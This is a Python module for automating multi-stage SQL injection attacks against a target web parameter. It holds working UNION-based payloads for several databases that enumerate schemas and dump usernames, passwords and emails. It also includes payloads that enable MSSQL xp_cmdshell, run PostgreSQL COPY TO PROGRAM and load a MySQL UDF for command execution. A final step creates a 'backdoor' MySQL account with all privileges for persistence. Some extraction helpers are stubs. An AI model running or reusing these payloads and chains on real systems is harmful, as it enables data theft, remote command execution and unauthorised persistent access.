"""
Exploit Chain Automation System

Orchestrates multi-stage attacks by chaining multiple exploitation techniques
together to achieve complex objectives like data exfiltration, privilege
escalation, and persistent access.
"""

import logging
from typing import List, Dict, Any, Optional, Callable
from dataclasses import dataclass
from enum import Enum
import time

logger = logging.getLogger(__name__)


class ExploitObjective(Enum):
    """Exploit chain objectives"""
    DATA_EXTRACTION = "data_extraction"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    PERSISTENCE = "persistence"
    LATERAL_MOVEMENT = "lateral_movement"
    RECONNAISSANCE = "reconnaissance"
    FULL_COMPROMISE = "full_compromise"


class ExploitStage(Enum):
    """Exploit chain stages"""
    INITIAL_ACCESS = "initial_access"
    INFORMATION_GATHERING = "information_gathering"
    PRIVILEGE_CHECK = "privilege_check"
    EXPLOITATION = "exploitation"
    POST_EXPLOITATION = "post_exploitation"
    CLEANUP = "cleanup"


@dataclass
class ExploitStep:
    """Single step in exploit chain"""
    step_id: int
    stage: ExploitStage
    name: str
    description: str
    payload: str
    expected_output: str
    success_indicator: Callable
    fallback_steps: List[int]  # Alternative steps if this fails
    cleanup_required: bool = False


@dataclass
class ExploitChainResult:
    """Result of exploit chain execution"""
    objective: ExploitObjective
    success: bool
    steps_executed: int
    steps_succeeded: int
    data_extracted: Dict[str, Any]
    privileges_obtained: List[str]
    persistence_achieved: bool
    execution_log: List[Dict[str, Any]]
    recommendations: List[str]


class ExploitChainAutomation:
    """
    Automated exploit chain orchestration system.
    Chains multiple exploitation techniques to achieve complex objectives.
    """
    
    def __init__(self, sql_engine):
        """
        Initialize exploit chain automation.
        
        Args:
            sql_engine: SQLInjectionEngine instance
        """
        self.sql_engine = sql_engine
        self.execution_log = []
        self.extracted_data = {}
        self.current_privileges = []
        
        logger.info("Exploit chain automation initialized")
    
    def _log_step(self, step: ExploitStep, success: bool, output: Any, error: str = None):
        """Log exploit step execution"""
        log_entry = {
            'step_id': step.step_id,
            'stage': step.stage.value,
            'name': step.name,
            'success': success,
            'output': str(output)[:200] if output else None,
            'error': error,
            'timestamp': time.time(),
        }
        self.execution_log.append(log_entry)
        
        logger.info(f"Step {step.step_id} ({step.name}): {'SUCCESS' if success else 'FAILED'}")
    
    def build_data_extraction_chain(self, db_type: str, vulnerable_param: str,
                                   param_type: str) -> List[ExploitStep]:
        """
        Build exploit chain for data extraction.
        
        Args:
            db_type: Database type
            vulnerable_param: Vulnerable parameter
            param_type: Parameter type (GET/POST)
        
        Returns:
            List of ExploitStep objects
        """
        chain = []
        
        # Step 1: Extract database version
        chain.append(ExploitStep(
            step_id=1,
            stage=ExploitStage.INFORMATION_GATHERING,
            name="Extract Database Version",
            description="Retrieve database version information",
            payload=self._get_version_payload(db_type),
            expected_output="version string",
            success_indicator=lambda r: r and len(r.get('data', '')) > 0,
            fallback_steps=[2],
        ))
        
        # Step 2: Extract current user
        chain.append(ExploitStep(
            step_id=2,
            stage=ExploitStage.INFORMATION_GATHERING,
            name="Extract Current User",
            description="Retrieve current database user",
            payload=self._get_user_payload(db_type),
            expected_output="username",
            success_indicator=lambda r: r and 'user' in r.get('data', ''),
            fallback_steps=[3],
        ))
        
        # Step 3: Extract database name
        chain.append(ExploitStep(
            step_id=3,
            stage=ExploitStage.INFORMATION_GATHERING,
            name="Extract Database Name",
            description="Retrieve current database name",
            payload=self._get_database_payload(db_type),
            expected_output="database name",
            success_indicator=lambda r: r and len(r.get('data', '')) > 0,
            fallback_steps=[4],
        ))
        
        # Step 4: Enumerate tables
        chain.append(ExploitStep(
            step_id=4,
            stage=ExploitStage.EXPLOITATION,
            name="Enumerate Tables",
            description="List all tables in database",
            payload=self._get_tables_payload(db_type),
            expected_output="table names",
            success_indicator=lambda r: r and len(r.get('tables', [])) > 0,
            fallback_steps=[5],
        ))
        
        # Step 5: Enumerate columns
        chain.append(ExploitStep(
            step_id=5,
            stage=ExploitStage.EXPLOITATION,
            name="Enumerate Columns",
            description="List columns for interesting tables",
            payload=self._get_columns_payload(db_type),
            expected_output="column names",
            success_indicator=lambda r: r and len(r.get('columns', [])) > 0,
            fallback_steps=[6],
        ))
        
        # Step 6: Extract sensitive data
        chain.append(ExploitStep(
            step_id=6,
            stage=ExploitStage.EXPLOITATION,
            name="Extract Sensitive Data",
            description="Extract data from sensitive tables",
            payload=self._get_data_extraction_payload(db_type),
            expected_output="user data",
            success_indicator=lambda r: r and len(r.get('records', [])) > 0,
            fallback_steps=[],
        ))
        
        return chain
    
    def build_privilege_escalation_chain(self, db_type: str, vulnerable_param: str,
                                        param_type: str) -> List[ExploitStep]:
        """
        Build exploit chain for privilege escalation.
        
        Args:
            db_type: Database type
            vulnerable_param: Vulnerable parameter
            param_type: Parameter type
        
        Returns:
            List of ExploitStep objects
        """
        chain = []
        
        # Step 1: Check current privileges
        chain.append(ExploitStep(
            step_id=1,
            stage=ExploitStage.PRIVILEGE_CHECK,
            name="Check Current Privileges",
            description="Enumerate current user privileges",
            payload=self._get_privileges_payload(db_type),
            expected_output="privilege list",
            success_indicator=lambda r: r and 'privileges' in r,
            fallback_steps=[2],
        ))
        
        # Step 2: Attempt privilege escalation
        if db_type == 'mysql':
            chain.append(ExploitStep(
                step_id=2,
                stage=ExploitStage.EXPLOITATION,
                name="MySQL UDF Privilege Escalation",
                description="Attempt privilege escalation via UDF",
                payload="'; CREATE FUNCTION sys_exec RETURNS STRING SONAME 'lib_mysqludf_sys.so'--",
                expected_output="function created",
                success_indicator=lambda r: r and r.get('success'),
                fallback_steps=[3],
            ))
        elif db_type == 'mssql':
            chain.append(ExploitStep(
                step_id=2,
                stage=ExploitStage.EXPLOITATION,
                name="MSSQL xp_cmdshell Enable",
                description="Enable xp_cmdshell for command execution",
                payload="'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--",
                expected_output="xp_cmdshell enabled",
                success_indicator=lambda r: r and r.get('success'),
                fallback_steps=[3],
            ))
        elif db_type == 'postgresql':
            chain.append(ExploitStep(
                step_id=2,
                stage=ExploitStage.EXPLOITATION,
                name="PostgreSQL COPY TO PROGRAM",
                description="Use COPY TO PROGRAM for command execution",
                payload="'; COPY (SELECT version()) TO PROGRAM 'id'--",
                expected_output="command output",
                success_indicator=lambda r: r and r.get('success'),
                fallback_steps=[3],
            ))
        
        # Step 3: Verify elevated privileges
        chain.append(ExploitStep(
            step_id=3,
            stage=ExploitStage.POST_EXPLOITATION,
            name="Verify Privileges",
            description="Confirm privilege escalation",
            payload=self._get_privileges_payload(db_type),
            expected_output="updated privilege list",
            success_indicator=lambda r: r and len(r.get('privileges', [])) > 0,
            fallback_steps=[],
        ))
        
        return chain
    
    def build_full_compromise_chain(self, db_type: str, vulnerable_param: str,
                                   param_type: str) -> List[ExploitStep]:
        """
        Build comprehensive exploit chain for full compromise.
        
        Args:
            db_type: Database type
            vulnerable_param: Vulnerable parameter
            param_type: Parameter type
        
        Returns:
            List of ExploitStep objects
        """
        # Combine reconnaissance, data extraction, and privilege escalation
        chain = []
        
        # Phase 1: Reconnaissance
        recon_chain = self.build_data_extraction_chain(db_type, vulnerable_param, param_type)[:3]
        chain.extend(recon_chain)
        
        # Phase 2: Privilege check and escalation
        priv_chain = self.build_privilege_escalation_chain(db_type, vulnerable_param, param_type)
        # Renumber steps
        max_id = max(s.step_id for s in chain)
        for step in priv_chain:
            step.step_id += max_id
            chain.append(step)
        
        # Phase 3: Data extraction
        data_chain = self.build_data_extraction_chain(db_type, vulnerable_param, param_type)[3:]
        max_id = max(s.step_id for s in chain)
        for step in data_chain:
            step.step_id += max_id
            chain.append(step)
        
        # Phase 4: Persistence (database-specific)
        max_id = max(s.step_id for s in chain)
        
        if db_type == 'mysql':
            chain.append(ExploitStep(
                step_id=max_id + 1,
                stage=ExploitStage.POST_EXPLOITATION,
                name="Create Backdoor User",
                description="Create persistent backdoor user account",
                payload="'; CREATE USER 'backdoor'@'%' IDENTIFIED BY 'P@ssw0rd'; GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%'--",
                expected_output="user created",
                success_indicator=lambda r: r and r.get('success'),
                fallback_steps=[],
                cleanup_required=True,
            ))
        
        return chain
    
    def execute_chain(self, chain: List[ExploitStep], url: str, method: str,
                     vulnerable_param: str, param_type: str,
                     params: Dict = None, data: Dict = None,
                     cookies: Dict = None, headers: Dict = None) -> ExploitChainResult:
        """
        Execute an exploit chain.
        
        Args:
            chain: List of ExploitStep objects
            url: Target URL
            method: HTTP method
            vulnerable_param: Vulnerable parameter
            param_type: Parameter type
            params: GET parameters
            data: POST data
            cookies: Cookies
            headers: Headers
        
        Returns:
            ExploitChainResult
        """
        logger.info(f"Executing exploit chain with {len(chain)} steps")
        
        steps_executed = 0
        steps_succeeded = 0
        objective = ExploitObjective.FULL_COMPROMISE  # Default
        
        for step in chain:
            steps_executed += 1
            
            try:
                # Execute step
                result = self._execute_step(
                    step, url, method, vulnerable_param, param_type,
                    params, data, cookies, headers
                )
                
                # Check success
                success = step.success_indicator(result) if result else False
                
                if success:
                    steps_succeeded += 1
                    
                    # Store extracted data
                    if result and isinstance(result, dict):
                        self.extracted_data.update(result)
                        
                        if 'privileges' in result:
                            self.current_privileges.extend(result['privileges'])
                
                self._log_step(step, success, result)
                
                # If step failed and has fallbacks, try them
                if not success and step.fallback_steps:
                    logger.info(f"Step {step.step_id} failed, trying fallback steps: {step.fallback_steps}")
                    # Continue to fallback steps
                    continue
                
                # If critical step failed with no fallbacks, abort
                if not success and not step.fallback_steps and step.stage in [ExploitStage.INITIAL_ACCESS, ExploitStage.EXPLOITATION]:
                    logger.warning(f"Critical step {step.step_id} failed, aborting chain")
                    break
            
            except Exception as e:
                logger.error(f"Step {step.step_id} raised exception: {e}")
                self._log_step(step, False, None, str(e))
                
                # Continue to next step or fallback
                if step.fallback_steps:
                    continue
        
        # Determine success
        success = steps_succeeded >= (steps_executed * 0.6)  # 60% success rate
        
        # Generate recommendations
        recommendations = self._generate_recommendations()
        
        result = ExploitChainResult(
            objective=objective,
            success=success,
            steps_executed=steps_executed,
            steps_succeeded=steps_succeeded,
            data_extracted=self.extracted_data,
            privileges_obtained=self.current_privileges,
            persistence_achieved=any(s.cleanup_required for s in chain if s.step_id <= steps_executed),
            execution_log=self.execution_log,
            recommendations=recommendations,
        )
        
        logger.info(f"Exploit chain completed: {steps_succeeded}/{steps_executed} steps succeeded")
        return result
    
    def _execute_step(self, step: ExploitStep, url: str, method: str,
                     vulnerable_param: str, param_type: str,
                     params: Dict, data: Dict, cookies: Dict, headers: Dict) -> Dict[str, Any]:
        """Execute a single exploit step"""
        # Build request with payload
        if param_type == 'GET':
            test_params = params.copy() if params else {}
            test_params[vulnerable_param] = step.payload
            response = self.sql_engine._make_request(url, method, test_params, data, cookies, headers)
        else:
            test_data = data.copy() if data else {}
            test_data[vulnerable_param] = step.payload
            response = self.sql_engine._make_request(url, method, params, test_data, cookies, headers)
        
        if not response:
            return {'success': False, 'error': 'No response'}
        
        # Parse response based on step type
        result = {
            'success': response.status_code == 200,
            'status_code': response.status_code,
            'data': response.text[:500],  # First 500 chars
        }
        
        # Extract specific data based on step stage
        if step.stage == ExploitStage.INFORMATION_GATHERING:
            # Try to extract version, user, or database name
            if 'version' in step.name.lower():
                result['version'] = self._extract_version(response.text)
            elif 'user' in step.name.lower():
                result['user'] = self._extract_user(response.text)
            elif 'database' in step.name.lower():
                result['database'] = self._extract_database(response.text)
        
        elif step.stage == ExploitStage.EXPLOITATION:
            if 'table' in step.name.lower():
                result['tables'] = self._extract_tables(response.text)
            elif 'column' in step.name.lower():
                result['columns'] = self._extract_columns(response.text)
            elif 'data' in step.name.lower():
                result['records'] = self._extract_records(response.text)
        
        elif step.stage == ExploitStage.PRIVILEGE_CHECK:
            result['privileges'] = self._extract_privileges(response.text)
        
        return result
    
    # Helper methods for payload generation
    def _get_version_payload(self, db_type: str) -> str:
        payloads = {
            'mysql': "' UNION SELECT @@version,NULL,NULL--",
            'postgresql': "' UNION SELECT version(),NULL,NULL--",
            'mssql': "' UNION SELECT @@version,NULL,NULL--",
            'oracle': "' UNION SELECT banner,NULL,NULL FROM v$version WHERE ROWNUM=1--",
        }
        return payloads.get(db_type, payloads['mysql'])
    
    def _get_user_payload(self, db_type: str) -> str:
        payloads = {
            'mysql': "' UNION SELECT user(),NULL,NULL--",
            'postgresql': "' UNION SELECT current_user,NULL,NULL--",
            'mssql': "' UNION SELECT SYSTEM_USER,NULL,NULL--",
            'oracle': "' UNION SELECT user,NULL,NULL FROM dual--",
        }
        return payloads.get(db_type, payloads['mysql'])
    
    def _get_database_payload(self, db_type: str) -> str:
        payloads = {
            'mysql': "' UNION SELECT database(),NULL,NULL--",
            'postgresql': "' UNION SELECT current_database(),NULL,NULL--",
            'mssql': "' UNION SELECT DB_NAME(),NULL,NULL--",
            'oracle': "' UNION SELECT ora_database_name,NULL,NULL FROM dual--",
        }
        return payloads.get(db_type, payloads['mysql'])
    
    def _get_tables_payload(self, db_type: str) -> str:
        payloads = {
            'mysql': "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--",
            'postgresql': "' UNION SELECT tablename,NULL,NULL FROM pg_tables WHERE schemaname='public'--",
            'mssql': "' UNION SELECT name,NULL,NULL FROM sysobjects WHERE xtype='U'--",
        }
        return payloads.get(db_type, payloads['mysql'])
    
    def _get_columns_payload(self, db_type: str) -> str:
        payloads = {
            'mysql': "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
            'postgresql': "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
            'mssql': "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
        }
        return payloads.get(db_type, payloads['mysql'])
    
    def _get_data_extraction_payload(self, db_type: str) -> str:
        return "' UNION SELECT username,password,email FROM users--"
    
    def _get_privileges_payload(self, db_type: str) -> str:
        payloads = {
            'mysql': "' UNION SELECT grantee,privilege_type,NULL FROM information_schema.user_privileges WHERE grantee=SUBSTRING_INDEX(USER(),'@',1)--",
            'postgresql': "' UNION SELECT usename,usesuper::text,NULL FROM pg_user WHERE usename=current_user--",
            'mssql': "'; SELECT name,type_desc,NULL FROM sys.database_principals WHERE name=SYSTEM_USER--",
        }
        return payloads.get(db_type, payloads['mysql'])
    
    # Helper methods for data extraction
    def _extract_version(self, text: str) -> Optional[str]:
        import re
        patterns = [r'(\d+\.\d+\.\d+)', r'MySQL.*?(\d+\.\d+)', r'PostgreSQL\s+(\d+\.\d+)']
        for pattern in patterns:
            match = re.search(pattern, text)
            if match:
                return match.group(1)
        return None
    
    def _extract_user(self, text: str) -> Optional[str]:
        # Simple extraction - would be more sophisticated in production
        import re
        match = re.search(r'([a-zA-Z0-9_]+)@', text)
        return match.group(1) if match else None
    
    def _extract_database(self, text: str) -> Optional[str]:
        return None  # Simplified
    
    def _extract_tables(self, text: str) -> List[str]:
        return []  # Simplified
    
    def _extract_columns(self, text: str) -> List[str]:
        return []  # Simplified
    
    def _extract_records(self, text: str) -> List[Dict]:
        return []  # Simplified
    
    def _extract_privileges(self, text: str) -> List[str]:
        return []  # Simplified
    
    def _generate_recommendations(self) -> List[str]:
        """Generate recommendations based on execution log"""
        recommendations = []
        
        if self.current_privileges:
            recommendations.append("Privileges detected - consider privilege escalation attacks")
        
        if self.extracted_data:
            recommendations.append("Sensitive data extracted - secure storage and access controls needed")
        
        if any(log['success'] for log in self.execution_log):
            recommendations.append("Successful exploitation detected - immediate remediation required")
        
        return recommendations
